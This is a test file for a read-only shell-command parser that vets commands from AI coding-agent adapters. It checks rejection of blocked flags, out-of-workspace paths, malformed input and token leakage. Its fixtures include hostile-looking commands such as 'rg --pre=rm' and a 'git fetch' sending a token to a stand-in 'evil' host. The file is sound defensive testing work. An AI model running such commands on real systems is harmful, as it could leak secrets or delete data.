import { readFileSync } from "node:fs";
import { describe, expect, it, vi } from "vitest";
import { parseReadonlyCommand, type CommandParseInput } from "./command-parser";
import { ALWAYS_BLOCKED_FLAGS, COMMAND_FLAGS } from "./command-flags";
import { baseInput, failureFixtures, macBoundaryFixtures, successFixtures } from "./command-parser.fixtures";

describe("readonly command parser (OA D3c-1)", () => {
  it.each(failureFixtures)("rejects $id: $command", ({ command, reason, adapter }) => {
    expect(parseReadonlyCommand({ ...baseInput, command, adapter: adapter ?? "claude-code" })).toEqual({ ok: false, reason });
  });

  it.each(successFixtures)("preserves argv and every path: $id", ({ command, argv, paths, implicitCwd = false, adapter = "claude-code" }) => {
    expect(parseReadonlyCommand({ ...baseInput, command, adapter })).toEqual({
      ok: true, wrapper: adapter === "codex" ? "zsh_lc" : "none", command: argv[0], argv, paths, implicitCwd,
    });
  });

  it.each(macBoundaryFixtures)("leaves filesystem facts to Mac: $id ($handoff)", ({ command, expected }) => {
    expect(parseReadonlyCommand({ ...baseInput, command })).toEqual(expected);
  });

  it.each([
    null, undefined, {}, { ...baseInput, adapter: "other" }, { ...baseInput, command: 1 },
    ...["relative", "/w/../proj", "", null, 42].flatMap((value) => [{ ...baseInput, cwd: value }, { ...baseInput, workspaceRoot: value }]),
    { ...baseInput, workspaceRoot: "/" }, { ...baseInput, workspaceRoot: "///./" },
  ])("validates malformed input without throwing: %j", (input) => {
    expect(parseReadonlyCommand(input as CommandParseInput)).toEqual({ ok: false, reason: "invalid_input" });
  });

  it.each([
    ["COMMAND_FLAGS", COMMAND_FLAGS], ["ALWAYS_BLOCKED_FLAGS", ALWAYS_BLOCKED_FLAGS],
  ])("deep-freezes %s at runtime", (_name, table) => {
    expect(Object.isFrozen(table)).toBe(true);
    for (const flags of Object.values(table)) expect(Object.isFrozen(flags)).toBe(true);
  });

  it("blocks dangerous flags even if they are accidentally added to a copy of the allow table", async () => {
    vi.resetModules();
    vi.doMock("./command-flags", () => ({
      COMMAND_FLAGS: { ...COMMAND_FLAGS, rg: { ...COMMAND_FLAGS.rg, "--pre": "value" } },
      ALWAYS_BLOCKED_FLAGS,
    }));
    try {
      const { parseReadonlyCommand: parseWithCopiedFlags } = await import("./command-parser");
      expect(parseWithCopiedFlags({ ...baseInput, command: "rg --pre=rm foo ." })).toEqual({ ok: false, reason: "flag_always_blocked" });
    } finally {
      vi.doUnmock("./command-flags");
      vi.resetModules();
    }
  });

  it.each(["/other", "/w/proj2", "/W/proj"])("rejects cwd outside the workspace: %s", (cwd) => {
    expect(parseReadonlyCommand({ ...baseInput, cwd })).toEqual({ ok: false, reason: "cwd_outside_workspace" });
  });

  it("normalizes cwd/root separators and resolves relative paths from cwd", () => {
    expect(parseReadonlyCommand({ ...baseInput, cwd: "/w//proj/./src/", workspaceRoot: "/w/proj/.", command: "cat ./a" })).toEqual({
      ok: true, wrapper: "none", command: "cat", argv: ["cat", "./a"], paths: [{ index: 1, absolute: "/w/proj/src/a" }], implicitCwd: false,
    });
  });

  it("accepts exactly 4096 code units and 64 words", () => {
    const name = "a".repeat(4092);
    expect(parseReadonlyCommand({ ...baseInput, command: `cat ${name}` })).toMatchObject({ ok: true, argv: ["cat", name] });
    const result = parseReadonlyCommand({ ...baseInput, command: ["cat", ...Array(63).fill("a")].join(" ") });
    expect(result).toMatchObject({ ok: true });
    if (result.ok) { expect(result.argv).toHaveLength(64); expect(result.paths).toHaveLength(63); }
  });

  it.each([
    "cat /outside/private-token-EXAMPLE", "cat ../private-token-EXAMPLE", "git fetch https://private-token-EXAMPLE@evil/r",
    "cat private-token-EXAMPLE > out", "rg --pre private-token-EXAMPLE .", 'cat "private-token-EXAMPLE$HOME"',
  ])("never leaks input in a failure: %s", (command) => {
    const result = parseReadonlyCommand({ ...baseInput, command });
    expect(result.ok).toBe(false);
    expect(Object.keys(result).sort()).toEqual(["ok", "reason"]);
    expect(JSON.stringify(result)).not.toContain("private-token-EXAMPLE");
    expect(JSON.stringify(result)).not.toContain(baseInput.workspaceRoot);
  });

  it.each(["command-parser.ts", "command-flags.ts"])("has no runtime/platform dependencies: %s", (name) => {
    const source = readFileSync(new URL(`./${name}`, import.meta.url), "utf8");
    const imports = [...source.matchAll(/(?:\bfrom\s+|\bimport\s*(?:\(\s*)?|\brequire\s*\(\s*)["']([^"']+)["']/g)].map((match) => match[1]);
    expect(imports.filter((specifier) => specifier !== "./command-flags")).toEqual([]);
    expect(source).not.toMatch(/\b(?:process|fetch|eval|Function|require)\s*[.(]/);
  });
});
